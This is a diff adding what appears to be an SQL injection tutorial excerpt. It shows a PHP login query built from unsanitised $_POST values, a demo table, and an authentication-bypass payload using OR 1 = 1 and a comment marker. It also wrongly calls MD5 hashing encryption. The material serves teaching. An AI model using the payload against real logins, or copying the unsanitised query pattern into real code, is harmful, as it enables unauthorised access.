@@ -1,0 +1,46 @@
+The above form accepts the email address, and password then submits them to a 
+PHP file named index.php.
+It has an option of storing the login session in a cookie. We have deduced this 
+from the remember_me checkbox. It uses the post method to submit data. This means 
+the values are not displayed in the URL.
+
+Let’s suppose the statement at the backend for checking user ID is as follows
+
+SELECT * FROM users WHERE email = $_POST['email'] AND password = md5($_POST['password']);
+
+The above statement uses the values of the $_POST[] array directly without sanitizing 
+them.
+The password is encrypted using MD5 algorithm.
+
+To demonstrate the attack, lets go to www.sqlfiffle.com
+
+Enter the below code in the left panel
+
+CREATE TABLE `users` (
+  `id` INT NOT NULL AUTO_INCREMENT,
+  `email` VARCHAR(45) NULL,
+  `password` VARCHAR(45) NULL,
+  PRIMARY KEY (`id`));
+  
+  
+insert into users (email,password) values ('m@m.com',md5('abc'));
+
+When we want to authenticate a user, this might be the SQL query running in the 
+background.
+
+SELECT * FROM users WHERE email = 'admin@admin.sys' AND password = md5('1234');
+
+So, lets exploit this weakness and perform an attack!!
+
+SELECT * FROM users 
+WHERE 
+email = 'xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' ] 
+AND 
+password = md5('0000');
+
+
+xxx@xxx.xxx ends with a single quote which completes the string quote
+OR 1 = 1 LIMIT 1 is a condition that will always be true and limits the returned 
+results to only one record.
+-- ' AND … is a SQL comment that eliminates the password part.
+
